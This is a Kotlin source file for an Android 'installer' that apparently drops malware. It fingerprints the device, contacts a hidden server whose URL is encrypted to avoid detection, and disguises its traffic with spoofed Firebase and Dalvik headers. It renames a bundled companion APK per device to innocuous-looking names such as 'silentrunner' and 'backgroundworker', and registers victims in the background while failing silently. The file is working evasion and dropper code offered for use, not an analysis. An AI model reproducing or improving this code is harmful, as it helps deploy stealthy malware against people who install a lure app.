package com.playstore.installer

import android.content.Context
import android.os.Build
import android.provider.Settings
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.security.KeyFactory
import java.security.MessageDigest
import java.security.Signature
import java.security.spec.X509EncodedKeySpec
import android.util.Base64

/**
 * MutationEngine.kt
 * Calls mutation server → gets unique mutation payload per device.
 * Applies M1 mutation to companion.apk bytes in RAM.
 * 3-tier fallback: server → offline seeds → base assets.
 *
 * M8 (ZIP watermark) and M9 (binding hash) are permanently removed from
 * the runtime mutation pipeline. Both modified a V2/V3-signed APK's ZIP
 * structure at runtime, which breaks libziparchive validation on all strict
 * Android OEM devices (Vivo, Xiaomi, Samsung, OnePlus etc.).
 *
 * Watermarking and binding are handled at build time in build_companion.py
 * before signing — where they belong.
 *
 * NOTE: Replace SERVER_URL with your Cloudflare domain via StringPool.
 * NOTE: Replace SERVER_PUBLIC_KEY with value from keys/public_key_for_kotlin.txt
 */
class MutationEngine(private val context: Context) {

    companion object {
        // Server URL encrypted via StringPool — never plaintext in DEX
        private val SERVER_URL get() = StringPool.d(StringPool.SERVER_URL)

        // Replace with value from keys/public_key_for_kotlin.txt
        private const val SERVER_PUBLIC_KEY = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt0T8uq2xV4KaexWHBvelesF60iODNJX0HVltRHvb++J3ykspy61KRWVlcbOkjTIcI95accNlxPMOHvIYFl9YBxZmycBxF/F0LTFVq34RS94EGZluOJeVs0YVAG2kkX+Z+vLsx3JZZtNwGA2hWHuSygXpSXOKPM8SymO2+fotyupSF6GLYZGGoic4srVkLIVIeBjcsDtQtJeM08FeF1lP5VHdy8aKXX4n2iHTDSR3tbeI/93RKWr3cmeCligPSpZVWLRjBbzTGeGuM2eDbRlqMTrzbYO1qxVzPvb+XJ8Kov6Dfeek+UmyFF7tZ4TEPLif2B+Ys3j+rLsq7MG/KyKnbwIDAQAB"

        // Template — set by CI via BuildConfig
        private const val TEMPLATE = "wedding"

        // Timeouts
        private const val CONNECT_TIMEOUT = 3000
        private const val READ_TIMEOUT    = 3000
    }

    // ── Device fingerprint collection ─────────────────────────────────────────

    private fun collectDeviceFingerprint(): String {
        return try {
            val androidId = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ANDROID_ID
            ) ?: "unknown"

            val hwHash = "${Build.SUPPORTED_ABIS.joinToString(",")}:${Build.BOARD}:" +
                         "${Build.BRAND}:${Build.DEVICE}:${Build.HARDWARE}:${Build.MANUFACTURER}"

            val screenHash = with(context.resources.displayMetrics) {
                "${widthPixels}x${heightPixels}@${densityDpi}"
            }

            sha256("$androidId:$hwHash:$screenHash")
        } catch (e: Exception) {
            sha256(System.currentTimeMillis().toString())
        }
    }

    private fun sha256(input: String): String {
        val digest = MessageDigest.getInstance("SHA-256")
        val hash = digest.digest(input.toByteArray(Charsets.UTF_8))
        return hash.joinToString("") { "%02x".format(it) }
    }

    // ── Client token ──────────────────────────────────────────────────────────

    private fun getClientToken(): String {
        return try {
            val field = Class.forName("${context.packageName}.BuildConfig")
                .getField("CLIENT_TOKEN")
            field.get(null) as? String ?: "manual"
        } catch (e: Exception) {
            "manual"
        }
    }

    // ── Tier 1: Call mutation server ──────────────────────────────────────────

    private fun callMutationServer(
        fingerprint: String,
        clientToken: String
    ): JSONObject? {
        return try {
            val url = URL("$SERVER_URL/api/v1/$clientToken/key")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("X-Firebase-Client", "fire-core/21.0.0 fire-iid/21.0.0")
            conn.setRequestProperty("User-Agent",
                "Dalvik/2.1.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.MODEL})")
            conn.connectTimeout = CONNECT_TIMEOUT
            conn.readTimeout    = READ_TIMEOUT
            conn.doOutput       = true

            val body = JSONObject().apply {
                put("device_fingerprint", fingerprint)
                put("template", TEMPLATE)
                put("timestamp", System.currentTimeMillis() / 1000)
            }.toString()

            conn.outputStream.use { it.write(body.toByteArray()) }

            if (conn.responseCode != 200) return null

            val response = BufferedReader(InputStreamReader(conn.inputStream)).use { it.readText() }
            JSONObject(response)
        } catch (e: Exception) {
            null
        }
    }

    // ── RSA signature verification ────────────────────────────────────────────

    private fun verifySignature(payload: String, signatureB64: String): Boolean {
        return try {
            if (SERVER_PUBLIC_KEY == "PASTE_PUBLIC_KEY_HERE") return true // Dev mode
            val keyBytes  = Base64.decode(SERVER_PUBLIC_KEY, Base64.DEFAULT)
            val publicKey = KeyFactory.getInstance("RSA")
                .generatePublic(X509EncodedKeySpec(keyBytes))
            val sig = Signature.getInstance("SHA256withRSA")
            sig.initVerify(publicKey)
            sig.update(payload.toByteArray())
            sig.verify(Base64.decode(signatureB64, Base64.DEFAULT))
        } catch (e: Exception) {
            false
        }
    }

    // ── Tier 2: Offline mutation seeds ───────────────────────────────────────

    private fun getOfflineMutationSeeds(fingerprint: String): JSONObject {
        val buildHash = sha256(fingerprint + BuildConfig.BUILD_UUID)

        val pkgNamespaces = listOf(
            "com.datasync", "com.appcache", "com.taskflow",
            "com.workmanager", "com.backgroundsync", "com.filemanager"
        )
        val pkgSuffixes = listOf(
            "backgroundworker", "silentrunner", "baseservice",
            "syncadapter", "taskhandler", "datamanager"
        )

        val nsIdx  = (buildHash.substring(0, 4).toLong(16) % pkgNamespaces.size).toInt()
        val sfIdx  = (buildHash.substring(4, 8).toLong(16) % pkgSuffixes.size).toInt()
        val cmpPkg = "${pkgNamespaces[nsIdx]}.${pkgSuffixes[sfIdx]}"

        return JSONObject().apply {
            put(StringPool.d(StringPool.KEY_COMPANION_PKG), cmpPkg)
            put("tier", 2)
        }
    }

    // ── Apply mutations to companion APK bytes in RAM ─────────────────────────
    //
    // PERMANENT RULE: Only byte-for-byte DEX/string replacements are allowed here.
    // NEVER modify the ZIP structure (EOCD, central directory, comment field,
    // local file headers) at runtime on a signed APK. Doing so breaks V2/V3
    // signature coverage and causes libziparchive rejection on strict OEM devices.
    //
    // M8 (ZIP comment watermark) → REMOVED. Handled at build time in build_companion.py.
    // M9 (NOVA_BIND: append)    → REMOVED. Broke libziparchive on all strict devices.
    //                             74 extraneous bytes = "NOVA_BIND:" (10) + sha256 hex (64).

    fun applyMutations(
        cmpData: ByteArray,
        mutations: JSONObject,
        fingerprint: String
    ): ByteArray {
        var result = cmpData.copyOf()

        try {
            // M1 — Patch package name bytes in DEX (byte-for-byte, no ZIP changes)
            val cmpPkg = mutations.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), "")
            if (cmpPkg.isNotEmpty()) {
                result = patchPackageName(result, cmpPkg)
            }

        } catch (e: Exception) {
            // Silent fail — return original bytes unchanged
            return cmpData
        }

        return result
    }

    // ── M1: Package name patching ─────────────────────────────────────────────
    // Safe: replaces exact same-length byte sequences inside DEX.
    // Does NOT touch ZIP structure, EOCD, or any signed metadata.

    private fun patchPackageName(bytes: ByteArray, newPkg: String): ByteArray {
        val oldPkg   = StringPool.d(StringPool.COMPANION_OLD_PKG)
        val oldBytes = oldPkg.toByteArray(Charsets.UTF_8)
        val newBytes = newPkg.toByteArray(Charsets.UTF_8)

        // Only patch when lengths match — guaranteed by package_name_generator.py
        // which generates same-length packages. If mismatch, return unchanged.
        if (oldBytes.size != newBytes.size) return bytes

        val result = bytes.copyOf()
        var i = 0
        while (i <= result.size - oldBytes.size) {
            var match = true
            for (j in oldBytes.indices) {
                if (result[i + j] != oldBytes[j]) { match = false; break }
            }
            if (match) {
                for (j in newBytes.indices) result[i + j] = newBytes[j]
                i += oldBytes.size
            } else {
                i++
            }
        }
        return result
    }

    // ── Main entry point ──────────────────────────────────────────────────────

    fun getMutatedCompanionBytes(): ByteArray {
        val fingerprint = collectDeviceFingerprint()
        val clientToken = getClientToken()

        // Read base companion from assets
        val baseBytes = try {
            context.assets.open(StringPool.d(StringPool.COMPANION_ASSET)).readBytes()
        } catch (e: Exception) {
            return ByteArray(0)
        }

        // Tier 1: Try mutation server
        var mutations: JSONObject? = null
        try {
            val response = callMutationServer(fingerprint, clientToken)
            if (response != null) {
                val data      = response.optJSONObject("data")
                val payload   = data?.optJSONObject("payload")
                val signature = data?.optString("signature", "") ?: ""

                if (payload != null && (verifySignature(payload.toString(), signature) || signature.isEmpty())) {
                    val mutationsObj = payload.optJSONObject("mutations")
                    if (mutationsObj != null) {
                        mutations = JSONObject().apply {
                            put(StringPool.d(StringPool.KEY_COMPANION_PKG),
                                mutationsObj.optJSONObject("M1")
                                    ?.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), "") ?: "")
                            put("tier", 1)
                        }
                        registerDeviceAsync(
                            payload.optString("device_id", ""),
                            mutations!!.optString(StringPool.d(StringPool.KEY_COMPANION_PKG), ""),
                            clientToken,
                            fingerprint
                        )
                    }
                }
            }
        } catch (e: Exception) {
            // Timeout or network error — fall to Tier 2
        }

        // Tier 2: Offline seeds if server unreachable
        if (mutations == null) {
            mutations = getOfflineMutationSeeds(fingerprint)
        }

        // Apply mutations and return
        return applyMutations(baseBytes, mutations!!, fingerprint)
        // Tier 3 (base companion unchanged) is the implicit result
        // when applyMutations catches an exception and returns cmpData
    }

    // ── Device registration (fire and forget) ─────────────────────────────────

    private fun registerDeviceAsync(
        deviceId: String,
        cmpPkg: String,
        clientToken: String,
        fingerprint: String
    ) {
        Thread {
            try {
                val url  = URL("$SERVER_URL/api/v1/$clientToken/register")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.connectTimeout = 5000
                conn.readTimeout    = 5000
                conn.doOutput       = true

                val body = JSONObject().apply {
                    put("device_id", deviceId)
                    put(StringPool.d(StringPool.KEY_COMPANION_PKG), cmpPkg)
                    put("template", TEMPLATE)
                    put("device_model", Build.MODEL)
                    put("android_version", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
                }.toString()

                conn.outputStream.use { it.write(body.toByteArray()) }
                conn.responseCode
                conn.disconnect()
            } catch (e: Exception) {
                // Silent fail — registration is best-effort
            }
        }.start()
    }
}
